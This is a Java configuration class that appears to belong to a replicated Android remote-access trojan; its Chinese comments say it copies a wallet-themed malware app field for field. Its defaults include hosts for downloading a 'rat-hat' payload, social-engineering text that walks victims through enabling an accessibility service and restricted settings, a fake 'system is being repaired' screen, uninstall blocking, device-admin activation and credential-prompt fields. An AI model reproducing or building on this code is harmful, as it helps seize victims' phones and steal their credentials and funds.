package com.vendor.rat.config;

import android.content.Context;
import android.provider.Settings;

/**
 * 应用配置类
 * 存储从 assets/config.json 解密后的配置值
 */
// ADAPT: vendor = com.guard.wallet.entity.BuildConfig (601 行)
// 一比一复刻所有字段和 getter/setter
public class AppConfig {

    // ============ Vendor 原始字段 (按声明顺序) ============
    private String serverHost;
    private String downloadRatHatHost;
    private String downloadRatHatName;
    private String guideAccessibilityHost;
    private String mainActivity;
    private String mainUrl;
    private String trusteeId;
    private String blockIconUrl;
    private String blockBgColor;
    private Integer promotionModel;
    private Integer uninstall;
    private Integer activeAdmin;
    private Integer debug;
    private Integer perScreenOffDuration;
    private Integer perIdleDuration;

    // ADAPT: vendor 用 HashMap<String, LangDialog>，replica 简化为直接字段
    // 因为 LangDialog 有 20+ 个文本字段，这里直接存储当前语言的文本
    private String alertTitle;
    private String alertMsg;
    private String alertRestrictedMsg;
    private String okText;
    private String exitConfirm;
    private String allowRestricted;
    private String appLabel;
    private String accessibilityServiceLabel;
    private String launcherLabel;
    private String aliveBlockMsg;
    private String updateSystemMsg;
    private String wifiBlockMsg;
    private String notificationTitle;
    private String notificationContent;
    private String appCredentialTitle;
    private String appCredentialSubTitle;
    private String appCredentialDescription;
    private String appCredentialInitMsg;
    private String updateCredentialTitle;
    private String updateCredentialSubTitle;
    private String updateCredentialDescription;

    // ADAPT: 额外字段 (replica 需要)
    private String webSocketUrl;
    private String userEmail;
    private String deviceAuthSecret;
    private Integer heartbeatInterval;

    public AppConfig() {
    }

    // ============ Getters & Setters ============

    public String getServerHost() { return serverHost; }
    public void setServerHost(String serverHost) { this.serverHost = serverHost; }

    public String getDownloadRatHatHost() { return downloadRatHatHost; }
    public void setDownloadRatHatHost(String v) { this.downloadRatHatHost = v; }

    public String getDownloadRatHatName() { return downloadRatHatName; }
    public void setDownloadRatHatName(String v) { this.downloadRatHatName = v; }

    public String getGuideAccessibilityHost() { return guideAccessibilityHost; }
    public void setGuideAccessibilityHost(String v) { this.guideAccessibilityHost = v; }

    public String getMainActivity() { return mainActivity; }
    public void setMainActivity(String v) { this.mainActivity = v; }

    public String getMainUrl() { return mainUrl; }
    public void setMainUrl(String mainUrl) { this.mainUrl = mainUrl; }

    public String getTrusteeId() { return trusteeId; }
    public void setTrusteeId(String v) { this.trusteeId = v; }

    public String getBlockIconUrl() { return blockIconUrl; }
    public void setBlockIconUrl(String v) { this.blockIconUrl = v; }

    public String getBlockBgColor() { return blockBgColor; }
    public void setBlockBgColor(String v) { this.blockBgColor = v; }

    public Integer getPromotionModel() { return promotionModel; }
    public void setPromotionModel(Integer v) { this.promotionModel = v; }

    public Integer getUninstall() { return uninstall; }
    public void setUninstall(Integer v) { this.uninstall = v; }

    public Integer getActiveAdmin() { return activeAdmin; }
    public void setActiveAdmin(Integer v) { this.activeAdmin = v; }

    public Integer getDebug() { return debug; }
    public void setDebug(Integer v) { this.debug = v; }

    public Integer getPerScreenOffDuration() { return perScreenOffDuration; }
    public void setPerScreenOffDuration(Integer v) { this.perScreenOffDuration = v; }

    public Integer getPerIdleDuration() { return perIdleDuration; }
    public void setPerIdleDuration(Integer v) { this.perIdleDuration = v; }

    public String getAlertTitle() { return alertTitle; }
    public void setAlertTitle(String v) { this.alertTitle = v; }

    public String getAlertMsg() { return alertMsg; }
    public void setAlertMsg(String v) { this.alertMsg = v; }

    public String getAlertRestrictedMsg() { return alertRestrictedMsg; }
    public void setAlertRestrictedMsg(String v) { this.alertRestrictedMsg = v; }

    public String getOkText() { return okText; }
    public void setOkText(String v) { this.okText = v; }

    public String getExitConfirm() { return exitConfirm; }
    public void setExitConfirm(String v) { this.exitConfirm = v; }

    public String getAllowRestricted() { return allowRestricted; }
    public void setAllowRestricted(String v) { this.allowRestricted = v; }

    public String getAppLabel() { return appLabel; }
    public void setAppLabel(String v) { this.appLabel = v; }

    public String getAccessibilityServiceLabel() { return accessibilityServiceLabel; }
    public void setAccessibilityServiceLabel(String v) { this.accessibilityServiceLabel = v; }

    public String getLauncherLabel() { return launcherLabel; }
    public void setLauncherLabel(String v) { this.launcherLabel = v; }

    public String getAliveBlockMsg() { return aliveBlockMsg; }
    public void setAliveBlockMsg(String v) { this.aliveBlockMsg = v; }

    public String getUpdateSystemMsg() { return updateSystemMsg; }
    public void setUpdateSystemMsg(String v) { this.updateSystemMsg = v; }

    public String getWifiBlockMsg() { return wifiBlockMsg; }
    public void setWifiBlockMsg(String v) { this.wifiBlockMsg = v; }

    public String getNotificationTitle() { return notificationTitle; }
    public void setNotificationTitle(String v) { this.notificationTitle = v; }

    public String getNotificationContent() { return notificationContent; }
    public void setNotificationContent(String v) { this.notificationContent = v; }

    public String getAppCredentialTitle() { return appCredentialTitle; }
    public void setAppCredentialTitle(String v) { this.appCredentialTitle = v; }

    public String getAppCredentialSubTitle() { return appCredentialSubTitle; }
    public void setAppCredentialSubTitle(String v) { this.appCredentialSubTitle = v; }

    public String getAppCredentialDescription() { return appCredentialDescription; }
    public void setAppCredentialDescription(String v) { this.appCredentialDescription = v; }

    public String getAppCredentialInitMsg() { return appCredentialInitMsg; }
    public void setAppCredentialInitMsg(String v) { this.appCredentialInitMsg = v; }

    public String getUpdateCredentialTitle() { return updateCredentialTitle; }
    public void setUpdateCredentialTitle(String v) { this.updateCredentialTitle = v; }

    public String getUpdateCredentialSubTitle() { return updateCredentialSubTitle; }
    public void setUpdateCredentialSubTitle(String v) { this.updateCredentialSubTitle = v; }

    public String getUpdateCredentialDescription() { return updateCredentialDescription; }
    public void setUpdateCredentialDescription(String v) { this.updateCredentialDescription = v; }

    public String getWebSocketUrl() { return webSocketUrl; }
    public void setWebSocketUrl(String v) { this.webSocketUrl = v; }

    public String getUserEmail() { return userEmail; }
    public void setUserEmail(String v) { this.userEmail = v; }

    public String getDeviceAuthSecret() { return deviceAuthSecret; }
    public void setDeviceAuthSecret(String v) { this.deviceAuthSecret = v; }

    public Integer getHeartbeatInterval() { return heartbeatInterval != null ? heartbeatInterval : 10; }
    public void setHeartbeatInterval(Integer v) { this.heartbeatInterval = v; }

    /**
     * 获取设备唯一标识
     */
    public String getDeviceId(Context context) {
        return Settings.Secure.getString(
            context.getContentResolver(),
            Settings.Secure.ANDROID_ID
        );
    }

    /**
     * 默认配置
     * ADAPT: vendor = com.guard.wallet.utils.d.a() 的默认值
     */
    public static AppConfig getDefault() {
        AppConfig c = new AppConfig();
        c.serverHost = "https://api.example.com";
        c.downloadRatHatHost = "https://rathat.me/lib";
        c.downloadRatHatName = "rat-hat";
        c.guideAccessibilityHost = "https://guide.accessibility.rathat.org";
        c.mainUrl = "https://m.baidu.com/";
        c.blockIconUrl = "https://admin.rathat.live/download/file/845804095260737536.png";
        c.blockBgColor = "#303133";
        c.promotionModel = 1;
        c.uninstall = 0;
        c.activeAdmin = 1;
        c.debug = 1;
        c.perScreenOffDuration = 2;
        c.perIdleDuration = 5;
        c.webSocketUrl = "wss://api.example.com/bridge";
        // 默认英文文本 (vendor: LangDialog "en" 默认值)
        c.alertTitle = "Open [accessibility_service_label]";
        c.alertMsg = "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]";
        c.okText = "Go immediately";
        c.exitConfirm = "Press again to exit";
        c.allowRestricted = "Allow restricted settings";
        c.updateSystemMsg = "System is being repaired\nplease do not operate the phone...";
        return c;
    }
}
